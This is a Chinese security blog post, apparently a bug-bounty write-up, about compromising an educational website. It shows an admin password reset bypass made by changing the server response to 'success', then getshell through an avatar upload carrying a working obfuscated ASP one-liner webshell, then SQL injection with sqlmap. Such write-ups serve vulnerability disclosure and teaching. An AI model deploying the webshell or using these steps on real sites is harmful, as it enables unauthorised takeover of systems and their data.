---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  edu漏洞挖掘：任意密码重置管理员账户&getshell  
安全小生  安全笑笑生   2026-01-06 12:27  
  
任意用户密码重置  
    
  
登录口找回密码：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjD3P3fkYE7Egn2qo7bpibWQicdnxRceOaBpRKbhpkmiaFONk2LgIwTfick1A/640?wx_fmt=png "")  
  
  
输入找回admin  
   
下一步  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjD7MCrRocTw2a4DTl8s6GzNiaMGiaAwlD43MHtp4rAkQWmV48yLiaiauGhOA/640?wx_fmt=png "")  
  
虽然是后四位  
   
可以直接爆破 但是这里不用 直接随便输入一个抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjD1wIyKic7PEuN3icAM542TIkGMhbZrrwPZRk44JsiaxTibIqPntquRFylOw/640?wx_fmt=png "")  
  
```
GET /ajax/Users/xxxxxxxxxxxs.aspx?LoginName=admin&Panswer=1111 HTTP/1.1              
Host: xxxxxxxxxxxxxx              
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36              
Content-Type: application/x-www-form-urlencoded              
Accept: 
/
Referer: xxxxxxxxxxxxxxxxxxxxx              
Accept-Encoding: gzip, deflate, br              
Accept-Language: zh-CN,zh;q=0.9              
Cookie: ASP.NET_SessionId=du0gw5bpvjkg3gnuagelkn2d              
Connection: keep-alive
```  
  
  
把返回包的数据修改为success  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDyib6PCz7IqiasI5awor0UtAfTB0y3js0WGg4kcQrRVFOTxic1IVzIib1gQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjD7K8pgiaTEUdyFsB8PZ7FsFTNpJ2GxcRIFWycwwyTj0vxQhCZCev6IDg/640?wx_fmt=png "")  
  
输入密码  
   
修改成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDWLibC6VCicZ7ugqiafrqUOHdERxkQE8ZCELdPia0k7DBRoswv95um3txiaw/640?wx_fmt=png "")  
  
他这个个人社区的账户是和后台管理的账户是绑定的  
      
  
账户密码是一样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDqkT6tDZ8WibvUibiaKzHyNbcQZhTsX3FNWKod4iceaLRUBBzD8Avt9jFzw/640?wx_fmt=png "")  
  
登入成功  
   
进而可以修改网站的所有配置  
  
更新头像处  
getshell  
  
因为上传的返回包不会返回路径  
   
先上传一个正常的图片 获得路径  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDY4n18xib3xQv0stCqX2nWcywLslI2a3licBz2PY8utYENAKOMTljkMRg/640?wx_fmt=png "")  
  
然后再抓一个上传正常的图片的包  
   
上传asp 在图片末尾加入一句话  
      
```
<%              
Class C8Ch              
Public Property Let SXEWH(Db4X836F5)              
Execute Left(Db4X836F5, 9999)              
End Property              
End Class              
Set a = New C8Ch              
a.SXEWH = Request("shell")              
%>
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDCXGTPIC2Pe4pLemTfSVxvwMFN0zYszIjETNCibB0rRZUjVXcIUlaMtw/640?wx_fmt=png "")  
  
上传成功  
  http://xxxxxxxx/xxxxxx/xxxxx/admin.asp  
  
也是用蚁剑成功连接  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDfk18PC7JnmCPYWP69OITnQwnOctgiaV07VicpJnibthl5XAeZ29xqTO0A/640?wx_fmt=png "")  
  
还有大量sql注入  
  
抓此处检索的包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDkzywuWmrvNEpG9HK83qRWenzrug6vmZyayRxkXtazZ0YPjqEWJNnQw/640?wx_fmt=png "")  
  
发现单引号报错  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/98XEXnUkvMibxCB3AxOnXQCaWOo0EP6ChkSAZzLX2OGvzTuZI3XoibHibnzQax9y5e6EPMxcFKRAHNic1DS6JCpyeA/640?wx_fmt=png "")  
  
这边图方便  
   
直接sqlmap 一把梭  
      
  
   ![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDahgHQQP08rjYOxdrM8a3kULGMrSAkWyZGnEksByQ4InO6mPwrOpAQA/640?wx_fmt=png "")  
  
  
也是找到了三个接口存在sql注入  
      
  
最后也是共计拿下12rank  
      
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/qERLC0KMKDFHqah8rxEsYgOmPjjGSGjDJGcjFB95XFlsEqJkDMwUgPnhsGxySrPYT86MVGztQtNDruGCbhENYQ/640?wx_fmt=png "")  
  
  
bytheway  
  
如果有师傅想法案例或者发什么文章的话，只要和安全相关直接私信我笑笑生就好了  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
